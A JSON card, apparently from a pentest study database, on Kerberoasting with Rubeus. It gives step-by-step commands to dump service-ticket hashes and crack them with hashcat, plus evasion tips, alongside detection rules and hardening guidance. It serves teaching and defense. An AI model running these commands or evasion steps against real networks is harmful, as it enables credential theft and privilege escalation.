@@ -1,0 +1,114 @@
+{
+  "id": "crtp-kerberoasting",
+  "name": "Kerberoasting (Rubeus /rc4opsec)",
+  "command": "Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt",
+  "description": "Request TGS tickets for all accounts with SPNs for offline cracking. /rc4opsec only roasts RC4-supporting accounts to avoid AES-only detection.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Domain PrivEsc",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS",
+    "OSCP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1558.003"
+  ],
+  "tools": [
+    "Rubeus"
+  ],
+  "tags": [
+    "kerberoasting",
+    "spn",
+    "tgs",
+    "rubeus",
+    "rc4opsec"
+  ],
+  "steps": [
+    {
+      "label": "Stats only (see who is roastable)",
+      "command": "Rubeus.exe kerberoast /stats"
+    },
+    {
+      "label": "Roast all with RC4 opsec",
+      "command": "Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt"
+    },
+    {
+      "label": "Roast specific account",
+      "command": "Rubeus.exe kerberoast /user:<user> /nowrap"
+    },
+    {
+      "label": "Crack with hashcat",
+      "command": "hashcat -m 13100 hashes.txt <wordlist> -r /usr/share/hashcat/rules/best64.rule"
+    }
+  ],
+  "examples": [
+    {
+      "label": "RC4 opsec roast all",
+      "command": "Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:C:\\Temp\\hashes.txt"
+    },
+    {
+      "label": "Crack with rockyou",
+      "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+    },
+    {
+      "label": "Stats mode (no hashes captured)",
+      "command": "Rubeus.exe kerberoast /stats"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-powerview-users-groups",
+      "note": "Find SPN accounts with PowerView first",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-kerberoast-crack",
+      "note": "CPTS card for cracking Kerberoast hashes",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync with cracked DA/privileged account creds",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-psremoting",
+      "note": "Lateral movement with cracked service account",
+      "rel": "next"
+    }
+  ],
+  "notes": "/rc4opsec only roasts accounts that support RC4. Newer CRTP labs have specific high-value service accounts as targets.",
+  "references": [
+    {
+      "title": "CRTP - Kerberoasting",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - Kerberoasting",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Any authenticated domain user can request a Kerberos service ticket (TGS) for any service with a registered SPN. The TGS is encrypted with the service account's NTLM hash (RC4 by default, or AES). Rubeus /rc4opsec requests only RC4 tickets (easier to crack). The encrypted blob is extracted and cracked offline with hashcat — no interaction with the target service required after the ticket is obtained.",
+    "prerequisites": "Any valid domain account (low-priv). Rubeus or impacket-GetUserSPNs. LDAP to enumerate SPNs. Kerberos TGS request access (port 88). Offline cracking capability (GPU + hashcat).",
+    "impact": "T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting. Service account password recovered offline. If the service account is a DA or has admin rights, immediate privilege escalation. Often service accounts have weak, old passwords — high crack rate.",
+    "detection": "Event 4769 (Kerberos Service Ticket Requested) with Ticket Encryption Type = 0x17 (RC4-HMAC) for service accounts — legitimate service ticket requests in modern environments use AES (0x12/0x13). SIEM rule: 4769 with EncryptionType=0x17 AND ServiceName is a service account (not krbtgt). MDI 'Kerberoasting' detection. Bulk TGS requests for multiple SPNs from a single user/source in a short window.\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
+    "artifacts": "Event 4769: multiple TGS requests for service accounts with RC4 encryption type | MDI alert: 'Kerberoasting attack' | DC Kerberos log: ServiceName entries for SPN accounts | SIEM: 4769 RC4 burst from single source",
+    "prevention": "Set long, random passwords on all service accounts (25+ chars) — makes cracking computationally infeasible. Use Group Managed Service Accounts (gMSA) — 240-char random auto-rotating passwords, immune to Kerberoasting. Force AES encryption on service accounts (Supported Encryption Types = 0x18 AES only). MDI deployment. Remove unnecessary SPNs. Monitor Event 4769.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
+    "evasion": "Request one ticket at a time with delays (--rc4opsec flag avoids 4769 AES downgrade noise). Request tickets only for high-value targets. Use /nowrap to avoid output format detection.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1558/003/"
+    ],
+    "misconfiguration": "Service accounts have weak/old passwords with SPNs registered. RC4 encryption type not restricted. No gMSA usage. SPNs set on user accounts rather than machine accounts. MDI not deployed.",
+    "vulnerable_config": "# Kerberoastable accounts (SPN + weak password):\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet,msDS-SupportedEncryptionTypes\n# PasswordLastSet: 2018 AND SupportedEncryptionTypes includes RC4 (0x17) → VULNERABLE\n\n# Weak service account passwords:\n# svc_sql: Password1  (set in 2018, never changed)\n# Rubeus requests RC4 ticket → hashcat cracks in minutes",
+    "secure_config": "# Use gMSA (auto-rotating 240-char passwords):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'dc01.corp.local' -ManagedPasswordIntervalInDays 30\nInstall-ADServiceAccount 'svc_sql'\nSet-Service -Name 'MSSQLSERVER' -Credential (Get-ADServiceAccountCredential 'svc_sql')\n\n# Force AES-only encryption on service accounts:\nSet-ADUser svc_sql -KerberosEncryptionType AES256\n# OR via attribute editor: msDS-SupportedEncryptionTypes = 16 (AES256 only)\n\n# Rotate passwords for non-gMSA service accounts (25+ char random):\n[System.Web.Security.Membership]::GeneratePassword(30, 5)\n# Paste result into: Set-ADAccountPassword svc_old -Reset -NewPassword ...\n\n# Alert on RC4 TGS requests:\n# SIEM: EventID=4769 AND TicketEncryptionType=0x17 AND ServiceName NOT IN (krbtgt, *$) → ALERT"
+  }
+}
